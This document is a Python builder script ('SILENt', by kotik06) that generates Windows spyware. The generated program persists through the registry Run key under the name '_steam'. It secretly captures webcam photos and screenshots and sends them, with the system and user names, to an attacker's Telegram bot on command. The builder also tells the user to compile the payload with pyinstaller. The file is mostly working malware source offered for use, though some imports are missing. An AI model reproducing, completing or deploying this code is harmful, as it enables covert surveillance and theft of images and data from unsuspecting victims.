# -*- coding: utf-8 -*- 
import colorama
import random


banners = [
'''\033[33m
                         __   _____  __    __    __ _   
                        / _\  \_   \/ /   /__\/\ \ \ |_ 
                        \ \    / /\/ /   /_\ /  \/ / __|
                        _\ \/\/ /_/ /___//__/ /\  /| |_ 
                        \__/\____/\____/\__/\_\ \/  \__|
                                                        
                                by kotik06                           \033[39m''',
"""
\033[31m
                   SSSSS  IIIII LL      EEEEEEE NN   NN tt    
                  SS       III  LL      EE      NNN  NN tt    
                   SSSSS   III  LL      EEEEE   NN N NN tttt  
                       SS  III  LL      EE      NN  NNN tt    
                   SSSSS  IIIII LLLLLLL EEEEEEE NN   NN  tttt 
                                                              
                                by kotik06                              \033[39m""",



r"""
     < SILENt >     
 -------------------
  \
   \
   |\_._/|
   |-o.o-|
   (  T  )
  .^`-^-'^.
  `.  ;  .'
  | | | | |
 ((_((|))_))
  ___________
 |           |
 |  kotik06  |
 |___________|


"""

]


def main():
	
	print(random.choice(banners))
	print("Version 0.2(beta)")
	tk=str(input("Telegram bot api token: "))
	proc=str(input("Process name (no file extension): "))
	#print("Admin id :");admin=int(input())
	auto=str(input("Path to autoload (C:\\Program Files\\Oracle\\ ) :"))
	if auto == '' or auto == ' ':
		auto='C:\\Program Files\\Oracle\\'
	py=proc+'.py'
	exe=proc+'.exe'
	f = open (py,'w')
	f.write(r"""
import time
import cv2# CODE BY SUDOREBOOT2020
import telebot
import os
def camera():
	
	# Включаем первую камеру
	cap = cv2.VideoCapture(0)
	name='cam1.png'
	# "Прогреваем" камеру, чтобы снимок не был тёмным
	for i in range(30):
		cap.read()
	# Делаем снимок
	ret, frame = cap.read()
	# Записываем в файл
	cv2.imwrite(name, frame)
	# Отключаем камеру
	cap.release()

def reestr():

	# Путь в реестре
	key_my = OpenKey(HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0, KEY_ALL_ACCESS)

	# Установить скрипт в автозагрузку
	SetValueEx(key_my, '_steam', 0, REG_SZ, r'"""+str(auto)+str(exe)+"""')

	# Закрыть реестр
	CloseKey(key_my)
def screen():
	name='screen1.png'
	im = p.screenshot(name)



def otpravka():
	bot = telebot.TeleBot('"""+str(tk)+"""')

	# Тут работаем с командой start
	@bot.message_handler(commands=['start'])
	def welcome_start(message):
		bot.send_message(message.chat.id, '''Hello user for screenshoot say : /screen\nfor photo : /cam''')

	@bot.message_handler(commands=['screen'])
	def welcome_start(message):
		screen()
		syss=os.name
		syss_2=os.getlogin() 
		ooo='sys:'+str(syss)+' user:'+str(syss_2)+' screen:'
		bot.send_message(message.chat.id,ooo)
		#file = open('cam1.png', 'rb')
		file_2=open('screen1.png', 'rb')
		bot.send_photo(message.chat.id, file_2)
	@bot.message_handler(commands=['cam'])
	def welcome_start(message):
		camera()	
		syss=os.name
		syss_2=os.getlogin() 
		ooo='sys:'+str(syss)+' user:'+str(syss_2)+' camera photo:'	
		bot.send_message(message.chat.id, ooo)
		file = open('cam1.png', 'rb')
		#file_2=open('screen1.png', 'rb')
		bot.send_photo(message.chat.id, file)


	bot.polling()

def main():
	
	reestr()
	otpravka()
	time.sleep(1)
if __name__ == '__main__':
	while 1:
		main()






		""")
	f.close()
	print('DONE')
	print("Use pyinstaller for make .exe file ")
	print('bot file is',py)
if __name__ == '__main__':
	main()